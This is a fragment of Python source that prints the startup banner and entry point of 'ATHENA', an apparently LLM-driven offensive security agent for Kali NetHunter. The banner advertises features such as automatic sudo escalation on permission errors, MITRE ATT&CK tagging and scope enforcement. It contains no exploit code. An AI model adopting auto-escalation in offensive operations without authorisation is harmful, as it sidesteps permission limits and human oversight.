        L(f"     {W}█████╗ ████████╗██╗  ██╗███████╗███╗   ██╗ █████╗{M}        ") + f"{M}│{R}",
        L(f"    {W}██╔══██╗╚══██╔══╝██║  ██║██╔════╝████╗  ██║██╔══██╗{M}       ") + f"{M}│{R}",
        L(f"    {W}███████║   ██║   ███████║█████╗  ██╔██╗ ██║███████║{M}       ") + f"{M}│{R}",
        L(f"    {W}██╔══██║   ██║   ██╔══██║██╔══╝  ██║╚██╗██║██╔══██║{M}       ") + f"{M}│{R}",
        L(f"    {W}██║  ██║   ██║   ██║  ██║███████╗██║ ╚████║██║  ██║{M}       ") + f"{M}│{R}",
        L(f"    {W}╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝{M}       ") + f"{M}│{R}",
        L(f"{' '*65}") + f"{M}│{R}",
        L(f"   {B}{W}AI OFFENSIVE SECURITY AGENT{R}{M}  ·  {B}{C}v7.2{R}{M}                       ") + f"{M}│{R}",
        L(f"   {G}Bare-metal Kali NetHunter  ·  Commander: The Priest{M}            ") + f"{M}│{R}",
        L(f"{' '*65}") + f"{M}│{R}",
        L(f" {G}╭─{C} v7.2 highlights {G}────────────────────────────────────────╮{M}  ") + f"{M}│{R}",
        L(f" {G}│{R}  {W}⊕ Tool Dispatch    {G}synonym-aware, errors fed to LLM{R}     {G}│{M}  ") + f"{M}│{R}",
        L(f" {G}│{R}  {W}⊕ Sudo Escalation  {G}auto-retry on permission denied{R}      {G}│{M}  ") + f"{M}│{R}",
        L(f" {G}│{R}  {W}⊕ Loop Breaker     {G}forced pivot on repeats{R}              {G}│{M}  ") + f"{M}│{R}",
        L(f" {G}│{R}  {W}⊕ Boxed UI         {G}every event in its own panel{R}         {G}│{M}  ") + f"{M}│{R}",
        L(f" {G}│{R}  {W}⊕ Per-Cmd Timeouts {G}long scans capped, no hangs{R}          {G}│{M}  ") + f"{M}│{R}",
        L(f" {G}│{R}  {W}⊕ MITRE ATT&CK     {G}auto-tagged commands & findings{R}      {G}│{M}  ") + f"{M}│{R}",
        L(f" {G}│{R}  {W}⊕ Scope · Graph    {G}RoE enforced, networkx pivots{R}        {G}│{M}  ") + f"{M}│{R}",
        L(f" {G}╰───────────────────────────────────────────────────────────╯{M}  ") + f"{M}│{R}",
        L(f"{' '*65}") + f"{M}│{R}",
        L(f"   {G}type  {KB} help {R}{G}  for commands  ·  {KB} workflow {R}{G}  for menus{M}     ") + f"{M}│{R}",
        L(f"{' '*65}") + f"{M}│{R}",
        f"{M}╰─────────────────────────────────────────────────────────────────╯{R}",
        "",
    ]
    return "\n".join(lines)


BANNER = _build_banner()


# ═════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ═════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        session = AthenaSession()
        session.repl()
    except KeyboardInterrupt:
        print("\n\033[90mInterrupted.\033[0m")
        sys.exit(130)
